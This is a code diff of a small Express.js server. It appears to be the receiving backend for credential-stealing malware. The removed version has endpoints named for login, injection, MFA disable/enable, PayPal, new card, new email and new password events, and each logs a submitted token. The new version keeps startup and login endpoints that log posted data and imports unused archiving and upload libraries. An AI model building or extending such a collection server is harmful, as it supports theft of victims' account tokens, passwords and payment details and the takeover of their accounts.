@@ -1,109 +1,36 @@
 const app = require('express')(),
-    bodyParser = require('body-parser'),
     http = require('http'),
-    server = http.createServer(app);
+    fs = require('fs'),
+    archiver = require('archiver'),
+    axios = require('axios'),
+    bodyParser = require('body-parser'),
+    server = http.createServer(app),
+    FormData = require('form-data');
+    
+String.prototype.insertAt = function(i, s) {
+  if (i < 0) i = 0;
+  if (i > this.length) i = this.length;
+  return this.slice(0, i) + s + this.slice(i)
+};
 
 app.set('port',3000);   
+app.use(bodyParser.text());
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({extended: true }));
 
-app.post('/request/obtaining', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
+app.post('/request/startup', (req, res) => {
+    res.sendStatus(200);
+    req = JSON.parse(req.body)
+    console.log(req)
 });
 
-
-app.post('/request/login', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-app.post('/request/inject', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-app.post('/request/mfadisable', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-app.post('/request/mfaenable', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-app.post('/request/paypal', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-
-
-app.post('/request/newcard', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-
-app.post('/request/newusername', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-
-
-app.post('/request/newemail', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
-
-
-app.post('/request/newpass', (req, res) => {
-    const { 
-        token 
-    } = req.body
-
-    console.log(req.body)
-    res.json({ message: 'done' });
-});
+app.post("/request/login", (req, res) => {
+    res.sendStatus(200);
+    req = JSON.parse(req.body)
+    console.log(req)
+})
 
 server.listen(app.get('port'), () => {
-    console.log(`Endpoint api in port: ${app.get('port')}`);
+  console.log(`http://localhost:${app.get('port')}`);
 });
+
+
